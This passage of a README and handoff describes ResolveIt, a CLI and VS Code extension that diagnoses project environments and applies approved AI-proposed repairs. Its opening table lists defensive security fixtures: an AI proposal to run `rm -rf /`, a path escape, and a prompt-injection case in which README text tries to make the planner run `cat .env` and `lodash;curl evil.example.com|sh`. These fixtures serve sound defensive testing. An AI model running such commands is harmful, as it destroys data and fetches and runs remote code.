| `malicious-ai-output/command-injection.json` | AI proposal asking to run `rm -rf /` via a `command` field — fully rejected |
| `malicious-ai-output/privilege-escalation.json` | AI self-granting `read-only` and path-escaping `../../outside.txt` — fully rejected |
| `prompt-injection/readme-instructions.json` | Project content attempting to drive the planner (`cat .env`, `lodash;curl evil.example.com\|sh`) — fully rejected |
| `docker-privileged`, `docker-socket`, `docker-host-mount`, `docker-host-network`, `docker-capabilities`, `docker-unpinned` | Each Docker security rule fires on a known-bad config |
| `docker-safe` | Negative control: a hardened config produces **zero** findings |
| `secrets/samples.txt` | Inert sample strings for redaction tests. These are fake/documented example values, not real credentials |

`tests/fixtures/ecosystems/` holds 20 further fixtures (npm/yarn/pnpm, Poetry, legacy
Python, Meson/Conan/vcpkg, Go workspace, Gradle catalogs, .NET central packages,
multi-project, nested, malformed) used to prove parser behaviour.

---

## Testing

### Core (`/`)

```bash
npm install
npm run build      # tsc
npm test           # vitest run
npm run lint       # eslint src
npx tsc --noEmit   # type-check only
```

### VS Code extension (`vscode/`)

```bash
cd vscode
npm install
npm run build            # typecheck + esbuild bundle -> dist/extension.js
npm test                 # vitest run (pretest rebuilds the bundle first)
npm run lint
npm run validate-package # manifest/code parity + packaging hygiene
npm run package          # vsce package -> resolveit-0.0.1.vsix
```

The extension suite mocks the `vscode` API (`vscode/tests/vscode-mock.ts` plus a
vitest alias), so **no VS Code instance is required** to run it. A bundle smoke test
additionally loads the built `dist/extension.js` with a `Module._load` patch and
asserts it activates and registers every contributed command and view.

### Verified results

Run on Windows 11, Node v24.13.0, npm 11.6.2, during this handoff:

| Check | Command | Result |
|---|---|---|
| Core build | `npm run build` | pass |
| Core typecheck | `npx tsc --noEmit` | pass |
| Core lint | `npm run lint` | pass, no findings |
| Core tests | `npm test` | **28 files, 457 tests, all passing** (~84–100 s) |
| Extension build | `vscode/ npm run build` | pass (typecheck + esbuild bundle) |
| Extension lint | `vscode/ npm run lint` | pass, no findings |
| Extension tests | `vscode/ npm test` | **8 files, 135 tests, all passing** (~70–75 s, includes rebuild) |
| Package validation | `vscode/ npm run validate-package` | pass |
| VSIX packaging | `vscode/ npm run package` | pass — `resolveit-0.0.1.vsix`, 5 files, 91.73 KB |
| CLI `--help` / `--version` | `node dist/cli/index.js --help` | exit 0, no stack trace |
| Local AI status | `node dist/cli/index.js ai` | `local` / `gemma3:4b` / available |

No test is skipped, focused, or marked todo in either suite.

`vsce package` emits two non-fatal warnings, both expected:

- `LICENSE, LICENSE.md, or LICENSE.txt not found` — the license lives at the repo
  root, not inside `vscode/`, and `vsce` only looks in the extension root. The
  manifest already declares `"license": "MIT"`. Packaging still succeeds; it would
  only matter for a Marketplace submission, which is explicitly out of scope.
- `The file extension/dist/extension.js is large (443.65 KB)` — an unminified
  esbuild bundle of Core + extension. Acceptable for a pre-release.

### Slow tests and environment sensitivity

These are **not flaky** — they are slow, and the reason is real work (real filesystem
scans and real subprocess probes for runtimes and tools). Expect them to dominate CI
time:

| Suite | Duration in this run | Why |
|---|---|---|
| `tests/agent-e2e.test.ts` (5 tests) | ~71 s | Full agent loop on real temp workspaces; three tests carry an explicit 120 s timeout |
| `tests/agent-run.test.ts` (36 tests) | ~19 s | Real observation + verification engines |
| `tests/security-hardening.test.ts` (42 tests) | ~5 s | Large-input and audit-bound cases (explicit 30 s timeout) |
| `vscode/tests/integration.test.ts` (25 tests) | ~55 s | One real end-to-end diagnose → deny → verify flow (explicit 120 s timeout) |
| `vscode/tests/commands.test.ts` (19 tests) | ~39 s | One real Core agent run to `resolved` (explicit 120 s timeout) |

Because those tests probe the real machine, **they will be slower on a host missing
runtimes and toolchains** — every missing tool costs a PATH lookup that has to fail
first. This is a known environmental sensitivity, not a defect. No timeout failure was
observed in this handoff run.

`tests/environment/command-runner.test.ts` is the only test that deliberately spawns
real processes, and it is written for Windows (`cmd /c ...`). The environment
adapters are unit-tested across win32/linux/darwin by overriding `process.platform`,
but **manual validation was performed on Windows only**.

---

## Docker support

ResolveIt has Docker/Compose **analysis** — static, diagnostic only.

### It can

- detect `Dockerfile` / `Containerfile` / `*.dockerfile` and Compose files
  (`docker-compose.{yml,yaml}`, `compose.{yml,yaml}`)
- parse image references, digests, `--platform`, private registries with ports, `ARG`,
  and build contexts
- diagnose Docker/Compose security misconfigurations:

  | Finding | Code | Severity |
  |---|---|---|
  | Privileged mode | `CONTAINER_PRIVILEGED_MODE` | critical |
  | Docker socket mount | `CONTAINER_DOCKER_SOCKET` | critical |
  | Host filesystem mount | `CONTAINER_HOST_MOUNT` | error / warning |
  | Host networking | `CONTAINER_HOST_NETWORK` | error |
  | Host PID / IPC | `CONTAINER_HOST_PID_IPC` | error |
  | Dangerous capabilities (`SYS_ADMIN`, `NET_ADMIN`, …) | `CONTAINER_DANGEROUS_CAPABILITY` | error |
  | Unpinned image / broad build context | `CONTAINER_UNPINNED_IMAGE`, `CONTAINER_BROAD_BUILD_CONTEXT` | warning |

  Unpinned images are framed as **posture**, never as malicious.
- report Docker daemon state as part of environment inspection

### It explicitly does NOT

- build images
- start, stop, or restart containers
- modify `Dockerfile` or Compose files
- remediate any Docker security finding (these diagnostics carry **no remediation
  candidates**, so no repair tool can apply them)
- verify live containers
- manage images, volumes, or networks

**ResolveIt itself is not Docker-deployable.** No Dockerfile or container deployment
for ResolveIt exists in this repository, and none has been tested. Do not describe it
as a container-based solution.

---

## UI / UX history

This section matters if you are picking up the UI work. The UI has been redesigned
three times:

### Phase 8–12: native tree views

The first interface was a conventional VS Code extension UI: four Explorer tree views
(details, diagnostics, environment, requirements), QuickPick approval dialogs,
output-channel logs, and a status bar item. It worked and is still present internally.

### Phase 13: dashboard redesign (attempted)

A status-dashboard webview was introduced to make the state of the project easier to
read at a glance (health, counts, AI status, proposed repairs, verification result).
It shipped, it is still in the codebase under `vscode/src/dashboard/`, and it is
still tested. **It was judged too difficult to navigate** and was not adopted as the
primary experience.

### Phase 14: Action Hub (radial hub)

The target UX was a **ResolveIt Action Hub** inspired by quick-access overlays —
invoke it, and a focused surface appears with ResolveIt in the centre and actions
around it in a radial arrangement.

A radial hub was implemented (`vscode/src/hub/`) — a collapsed `◆ ResolveIt` control
that expands into four nodes positioned around a central diamond, with SVG connector
lines, plus a focused AI-report screen inside the same view. It was registered as the
`resolveit.dashboard` **WebviewView** in the Explorer sidebar.

**It was not a floating overlay** — it expanded inside the sidebar.

### Phase 15: ResolveIt Workflow Panel (current)

The Action Hub has been replaced by a single on-demand **WebviewPanel** that
implements the complete linear workflow:

```
AI Mode → Project → Analyze → Status → Repair Plan → Approve/Deny → Apply → Verify → Resolved / Re-plan
```

This panel:
- Opens on demand via `ResolveIt: Open Workflow` command
- Uses `vscode.window.createWebviewPanel` (not a permanent sidebar view)
- Shows one step at a time with clear progress indicators
- Implements real bulk approval (Approve All / Deny All)
- Fixes the contradictory UI states (Failed + Awaiting approval no longer co-exist)
- Filters lockfile/transitive dependencies from repair proposals
- Never leaves the user in an infinite loading state

The obsolete sidebar WebviewViews (Action Hub, Details, Diagnostics, Environment,
Requirements) are no longer registered as primary UI. Their underlying core
functionality remains available through commands.

---

## Project structure

```
ResolveIt/
├── src/                        # ResolveIt Core
│   ├── core/                   # interfaces.ts, models.ts, workspace-manager.ts
│   ├── scanners/               # workspace/project/language classification
│   ├── environment/            # environment intelligence
│   │   ├── adapters/           # os, runtime, tools, package-managers, containers
│   │   └── command-runner.ts   # probe runner + allowlisted safe runner
│   ├── requirements/           # requirement discovery and project attribution
│   │   └── parsers/            # 17 parsers (python, node, node-lock, maven,
│   │                           #   gradle, rust, go, cmake, makefile, native,
│   │                           #   docker, others)
│   ├── diagnostics/            # engine, version-matcher, rules/ (8 rules)
│   ├── repair/                 # planner, executor, registry, audit, snapshots
│   │   └── tools/              # create-file, modify-file, install-dependency,
│   │                           #   create-python-venv
│   ├── safety/                 # ids, limits, paths, permission, secrets
│   ├── agent/                  # lifecycle, observation, analysis, planners,
│   │                           #   run-state, runner, verifier, events
│   ├── ai/                     # config, context, factory, http, prompt, response,
│   │   ├── providers/          #   local.ts, external.ts
│   │                           #   validation.ts
│   ├── cli/                    # commander CLI
│   ├── index.ts                # public Core API (the extension's only entry)
│   └── version.ts
├── tests/                      # 28 files, 457 tests
│   ├── fixtures/
│   │   ├── ecosystems/         # 20 parser fixtures
│   │   ├── integration/        # 13 release-matrix fixtures
│   │   └── security/           # hostile-input and Docker fixtures
│   ├── environment/            # 9 adapter/runner suites
│   └── *.test.ts
├── vscode/                     # VS Code extension (separate install)
│   ├── src/
│   │   ├── hub/                # Action Hub: model.ts, render.ts, view.ts
│   │   ├── dashboard/          # dashboard helpers: model, snapshot, cards,
│   │   │                       #   messages, render
│   │   ├── views/              # 4 TreeDataProviders
│   │   ├── ui/                 # approval dialogs, output channel, status bar, events
│   │   ├── commands.ts         # 18 command handlers
│   │   ├── state.ts            # ExtensionState
│   │   ├── operations.ts       # OperationCoordinator (locks, cancellation)
│   │   ├── core.ts             # CoreClient (public API only)
│   │   ├── workspace.ts        # WorkspaceService (first folder wins)
│   │   ├── mappers.ts          # model <-> UI mapping
│   │   ├── errors.ts           # error classification
│   │   └── extension.ts        # activation entry point
│   ├── tests/                  # 8 files, 135 tests (vscode API mocked)
│   ├── scripts/                # validate-package.mjs
│   └── dist/                   # bundle output (generated, ignored)
├── docs/
│   ├── architecture.md         # detailed architecture + per-phase status
│   └── release-checklist.md    # Phase 12 validation record
├── dist/                       # Core build output (generated, ignored)
├── package.json / package-lock.json
├── tsconfig.json / vitest.config.ts
├── .eslintrc.json / .prettierrc
├── .gitignore
├── AGENTS.md                   # development rules
├── LICENSE                     # MIT
└── README.md                   # this file
```

---

## Development

```bash
# Core
npm install
npm run build
npm test
npm run lint

# CLI
node dist/cli/index.js --help
node dist/cli/index.js scan .
node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run

# Extension
cd vscode
npm install
npm run build
npm test
npm run lint
npm run validate-package
npm run package
# then: code --install-extension .\resolveit-0.0.1.vsix --force
```

### Repository hygiene

Ignored (never commit these): `node_modules/`, `dist/`, `build/`, `*.tsbuildinfo`,
`*.vsix`, `.resolveit/` (audit log + repair snapshots created inside an analyzed
workspace), `.env`, `.env.local`, `.env.*.local`, `.vscode/`, `.idea/`, coverage,
logs, and temp files. `.env.example` / `.env.sample` are intentionally *not* ignored,
so template files can be committed.

The repository contains **no real credentials**. Values that look like secrets in
`tests/fixtures/` are deliberately fake and inert.

**One caveat worth knowing before you trust the secrets coverage:**
`tests/fixtures/integration/secrets/.env` is ignored by the `.env` rule, so it is
absent from a fresh clone. The test
`secrets: .env never parsed, findings and audit carry no secret values`
(`tests/integration-release.test.ts:268`) still passes there, but its assertions
become vacuous because there is no `.env` to leak. Locally the file exists and the
test is meaningful. If you want that coverage to be real on every machine, the fix
is for the test to write its own throwaway `.env` into the temp fixture copy rather
than to force-track a file matching the `.env` ignore rule.

---

## Phase history

Verified against git history on `master`.

| Phase | Commit | Description |
|-------|--------|-------------|
| 0 | `2743fe5` | Establish architecture: core interfaces, data models, CLI skeleton |
| 1 | `67b8089` | Workspace and project discovery |
| 2 | `225200d`, `0e3fe7c` | Environment intelligence (runtimes, tools, package managers, containers) + test coverage |
| 3 | `e615f5e` | Dependency and requirement intelligence |
| 4 | `760b53b` | Diagnostic engine |
| 5 | `1299796` | Repair and permission system (tools, registry, executor, snapshots, audit) |
| 6 | `d47225b` | Verification and agent loop |
| 7 | `02bd64e` | AI provider abstraction (No AI, Local, External) |
| 8 | `a51db11` | VS Code extension |
| 9 | `faa3842` | Extension ↔ Core integration hardening |
| 10 | `ed4d45d` | Multi-ecosystem hardening |
| 11 | `7f58fba` | Security, Docker, and audit hardening |
| 12 | `c65fc91` | Final integration / release validation |
| 13 | `70632e2` | UI/UX redesign (dashboard attempt) |
| 14 | `82e3600` | Action Hub |

Phases 0–12 define the architecture and safety model documented in
`docs/architecture.md`. Phases 13–14 are UI-only and are the areas that still need
work.

---

## Known limitations

Each of these was checked against the code during this handoff.

**Dependency and requirement analysis**

- No full dependency solver; no version conflict resolution
- Dependency status is often reported as `unknown` when no local inventory is
  available — it is never invented
- Dynamic/build-time discovery is limited (`setup.py` never executed, Gradle
  expressions, arbitrary CMake code)
- Lockfile/transitive entries get manual guidance, not automated installs
- Automated installs cover 6 ecosystems only (`npm`, `pip`, `cargo`, `go`,
  `composer`, `bundle`); Maven/Gradle/.NET/CMake deps are detected but not installed
- Binary lockfiles (`bun.lockb`) and `go.sum` are recognized but not parsed

**Repairs and permissions**

- Runtime and toolchain gaps produce **manual remediation paths**, not silent installs
- No elevation/sudo automation; system changes stay explicitly manual
- No rollback of dependency state — snapshots cover file content only
- Repairs depend on host tools actually working (a broken `pip`/`npm` fails the action)

**Docker**

- Diagnostic/static analysis only: never builds, starts, stops, or modifies anything
- No remediation of Docker findings
- No live container verification

**AI**

- Quality depends entirely on the selected model; small local models often produce
  invalid proposals (Core rejects them safely and falls back)
- External providers are user-supplied; ResolveIt ships no vendor integration
- Rejection reasons are recorded but not surfaced in the current UI

**Platform and process**

- Multi-root VS Code workspaces analyze the **first folder only** (announced once)
- Core operations are **not abortable** — cancellation detaches the UI and discards
  late results, but the underlying work may finish in the background
- Environment probing is slow on machines missing tools (each missing tool must fail a
  PATH lookup first)
- No CVE/vulnerability database integration
- No dedicated secret scanner — redaction is defence-in-depth, not secret detection
- Manual validation was performed on **Windows only**; Linux/macOS rest on unit tests

**UI and packaging**

- The Action Hub is a sidebar `WebviewView`, not the desired floating overlay
- Known Action Hub state bugs (see [Current UI Status](#current-ui-status))
- The extension is not published to any marketplace
- VSIX installation is manual, and a locally installed VSIX does not auto-update
  after source changes
- F5 / Extension Development Host is not configured in this repository

---

## Developer handoff

### What has already been built

Everything in Phases 0–12, which is a complete, working, tested system:

- **Deterministic core** — workspace/project discovery, environment intelligence,
  17 requirement parsers, 8 diagnostic rules, 4 repair tools with a registry,
  verification engine, agent loop, audit logger with secret redaction, safety and
  permission layer
- **AI layer** — three providers behind one abstraction, a trust boundary with
  multi-layer validation, and deterministic fallback
- **VS Code extension** — thin client, 18 commands, 5 views, operation coordination,
  error taxonomy, packaging validation
- **Tests** — 457 core tests across 28 files, 135 extension tests across 8 files,
  integration and security fixtures, mocked VS Code API
- **CLI** — 7 commands (`scan`, `environment`, `requirements`, `diagnose`, `repair`,
  `run`, `ai`) plus `version` / `help`, with human and JSON output, dry-run, and
  per-action approval

### What is stable

Treat these as load-bearing:

- `src/core/interfaces.ts` and `src/core/models.ts` — the public contracts
- `src/safety/` — permission levels, path containment, limits, secret redaction
- `src/ai/validation.ts` — the AI trust boundary
- `src/repair/registry.ts` and `src/repair/tools/` — the only execution path
- `src/agent/run-state.ts` — the agent state machine
- The extension ↔ Core boundary: the extension may only use `src/index.ts`

### What should not be changed casually

- **Do not weaken** `validateAIPlan` / `validateAIAction` to make AI output "work".
  Invalid proposals being rejected is the feature.
- **Do not** add a generic shell-execution repair path. Repairs go through
  registered, validated tools.
- **Do not** relax path containment or symlink fail-closed behaviour.
- **Do not** let the UI approve, escalate, or infer approvals. It collects them.
- **Do not** mark a repair verified without re-running verification.
- **Do not** execute `.env` files, `setup.py`, or any project-controlled code during
  analysis.
- **Do not** commit secrets, `.env` files, or a generated `.vsix`.

### What remains unfinished

1. **Action Hub UX** — move from the permanent sidebar `WebviewView` to an on-demand
   `WebviewPanel` (floating/quick-access), as described in
   [Current UI Status](#current-ui-status).
2. **Action lifecycle state model** — a failed or rejected action must not render an
   `Approved` badge, must not offer `Allow`, and must not be labelled `Verified`
   unless verification confirms *that* action. Fix `toRepairCard`
   (`vscode/src/dashboard/cards.ts`), the card renderer (`vscode/src/hub/render.ts`),
   and the verification flag (`vscode/src/hub/view.ts`).
3. **Surface Core rejection reasons** in the Action Hub instead of only logging them.
4. **Loading-state handling** — the "Loading ResolveIt…" placeholder has no timeout,
   retry, or error state.
5. **Decide the fate of `vscode/src/dashboard/`** — the Phase 13 dashboard is unused
   as a primary surface but still maintained and tested. Either finish it, fold it into
   the hub, or remove it deliberately.
6. **Not started, and deliberately so**: Docker remediation, a real dependency solver,
   CVE integration, a dedicated secret scanner, marketplace publishing.

### Where to start

**Do not begin by rewriting `src/`.** The Core and its safety architecture are
mature, tested, and the part of this project that works. Rewriting it is the highest
available risk with the lowest available reward.

If you are working on the UI, start here:

| File | Role |
|---|---|
| `vscode/src/hub/view.ts` | WebviewView host, HTML/CSP, message protocol, `postState` |
| `vscode/src/hub/model.ts` | Hub node enablement, labels, disabled reasons, centre status |
| `vscode/src/hub/render.ts` | Hub and report-card HTML/CSS — **where the contradictory badges live** |
| `vscode/src/dashboard/cards.ts` | `toRepairCard` and the action lifecycle — **the root of the state bug** |
| `vscode/src/dashboard/snapshot.ts` | State → snapshot mapping used by both surfaces |
| `vscode/src/dashboard/messages.ts` | Webview message allowlist/validation |
| `vscode/src/commands.ts` | Command handlers: analyze, plan, approve, apply, verify |
| `vscode/src/state.ts` | `ExtensionState`: approvals, plan, execution, verification |
| `vscode/src/operations.ts` | `OperationCoordinator`: per-workspace locks, cancellation |
| `vscode/src/core.ts` | `CoreClient` — the only Core surface the UI may use |
| `vscode/tests/hub.test.ts` | 26 tests covering hub model, render, and command routing |
| `vscode/tests/dashboard.test.ts` | 27 tests covering the dashboard model and HTML output |

Start by writing a failing test for the contradictory-state case, then fix the model.
The existing tests are the fastest way to understand the intended contract.

---

## Contributing

This is a pre-release project (0.0.1). The architecture is stabilised through
Phase 12; Phases 13–14 introduced UI work that is not finished.

Before opening a change:

1. Run both suites: `npm test` and `cd vscode && npm test`.
2. Ensure `npm run build` and `npm run lint` pass in both the root and `vscode/`.
3. For UI work, start in `vscode/src/hub/` and read
   [Current UI Status](#current-ui-status) first.
4. For Core work, respect the boundaries in `src/safety/` and `src/ai/validation.ts`.
5. Keep changes honest: document what you verified, and document what you did not.

`AGENTS.md` contains the project's standing development rules.

---

## License

MIT — see [LICENSE](LICENSE).
